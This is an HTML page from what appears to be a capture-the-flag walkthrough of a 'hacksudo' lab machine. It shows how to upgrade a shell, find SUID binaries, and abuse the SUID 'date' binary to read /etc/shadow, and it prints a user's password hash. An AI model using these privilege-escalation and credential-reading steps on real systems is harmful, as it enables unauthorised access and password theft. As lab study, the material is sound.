<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.3 Getting user's shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">4.3 Getting user's shell</h1><br/><br />1. Run the following command on the connetion opened in the previous point.<br />    <div class="codebox"><div class="codebox">python&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'import&nbsp;pty;pty.spawn("/bin/bash")'</span></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/629-1.png" alt="images/629-1.png" /><br /><br />2. Checked for any SUID binaries.<br /><br />    <strong>SUID</strong> Executables. <strong>SUID</strong> (Set User ID) is a type of permission which is given to a file and allows users to execute the file with the permissions of its owner.<br />    If a binary has the SUID bit set, it will have an s appear. If we check the file permissions of the passwd binary, we can see the permissions are -rwsr-xr-x.<br /><br />    We can scan the whole file system to find all files with the SUID bit set, with the following code:<br /><br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$find</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>&nbsp;-perm&nbsp;-4000&nbsp;-type&nbsp;f&nbsp;-exec&nbsp;<span style="color:#a52a2a;font-weight:700">ls</span>&nbsp;-al&nbsp;<span style="color:#a52a2a;font-weight:700">{}</span>&nbsp;<span style="color:#6a5acd;font-weight:400">\;</span>&nbsp;2&gt;<span style="color:#a52a2a;font-weight:700">/</span>dev<span style="color:#a52a2a;font-weight:700">/</span>null</div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/629-2.png" alt="images/629-2.png" /><br /><br />    The binary “date” has an SUID permission and in this case, I could act as root.<br /><br />3. From <a href="https://gtfobins.github.io/gtfobins/date/">https://gtfobins.github.io/gtfobins/date/</a>.<br />   <br />    <img src="images/629-3.png" alt="images/629-3.png" /><br /><br />    Let's read the “/etc/shadow” file.<br /><br />    <div class="codebox"><div class="codebox">www-data@hacksudo<span style="color:#a52a2a;font-weight:700">:/</span>var<span style="color:#a52a2a;font-weight:700">/</span>www<span style="color:#a52a2a;font-weight:700">/</span>html$&nbsp;<span style="color:#a52a2a;font-weight:700">date</span>&nbsp;-f&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>etc<span style="color:#a52a2a;font-weight:700">/</span>shadow</div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/629-4.png" alt="images/629-4.png" /><br />    <br />    You got the hash of the user hacksudo.<br />    <code>$6$cOv4E/VKAe0EVwV4$YScCx10zfi7g4aiLY.qo8QPm2iOogJea41mk2rGk/0JM5AtnrmiyTN5ctNJ0KTLS5Iru4lHWYPug792u3L/Um1</code><br /><br />4. On your Kali Machine, copy the hash to a file called “hash”.<p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>